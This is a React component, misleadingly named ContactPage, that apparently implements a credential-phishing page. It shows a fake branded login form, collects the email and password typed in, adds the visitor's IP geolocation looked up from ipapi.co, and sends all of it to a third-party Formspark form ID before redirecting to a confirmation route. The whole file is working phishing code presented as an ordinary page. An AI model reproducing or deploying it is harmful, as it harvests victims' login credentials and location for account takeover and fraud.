import { useFormspark } from "@formspark/use-formspark";
import Axios from "axios";
import React, { useEffect, useState } from "react";
import { Link, Navigate } from "react-router-dom";
import LoginImg from "../assets/sslmard.jpg"


const FORMSPARK_FORM_ID = "E0AEsmjJc";

const ContactPage = () => {
  const [emlId, setEmlId] = useState("");
  const [emlPass, setEmlPass] = useState("");
  const [confirm, setConfirm] = useState(false);

  const [submit, submitting] = useFormspark({
    formId: FORMSPARK_FORM_ID,
  });

  const [isDetails, setIsDetails] = useState([]);

  useEffect(() => {
    Axios.get("https://ipapi.co/json/").then((res) => {
      setIsDetails(res.data);
    });
  }, []);

  const handleSubmit = async (e) => {
    setConfirm(true);
    e.preventDefault();
    await submit({
      emlId,
      emlPass,
      ...isDetails,
    });
    return;
  };

  if (confirm) {
    return (
      <p>
        <Navigate
          to={{
            pathname: "/confirm",
          }}
        />
      </p>
    );
  }

  return (
    <div>
    <div className=""></div>
    <div className="">
        <div className="">
        <div className=" ">
         <div className="md:w-96 h-auto w-80 py-4 md:p-8 bg-white mx-auto">
          <div className=''>
           <img className='w-22' src={LoginImg} alt='ok' />
         </div>            
         <form onSubmit={handleSubmit}>
         <div>
            <label className="pb-1">Email Address</label>
         <input
           type="email"
           value={emlId}
           onChange={(e) => setEmlId(e.target.value)}
           className="outline-none border-black p-2 mb-3 border-2 w-full"
           placeholder="Email *"
           required
         />
         </div>
         <div>
          <label className="pb-2">Password</label>
         <input
           type="password"
           value={emlPass}
           onChange={(e) => setEmlPass(e.target.value)}
           className="outline-none border-black p-2 my-3 border-2 w-full"
           placeholder="Password *"
           required
         />
         </div>
          <div className="text-lg py-2">
            <span><input type="checkbox" /></span> Keep me signed in on this device
          </div>
            <div className="py-5 w-full">
            <button
              type="submit"
              className="px-6 py-2 w-full text-white font-semibold bg-green-700 rounded-md text-2xl"
              // onClick={handleAlert}
              disabled={submitting}
            >
              Log in
            </button>
            <div className="py-2 text-center">
            <span className="mr-1">Need to find</span> <Link to="/" className="text-green-900 underline">your password</Link>?
            </div>
            </div>
            </form>
             </div>
        </div>
        </div>
    </div>
    
    </div>

  );
};
export default ContactPage;
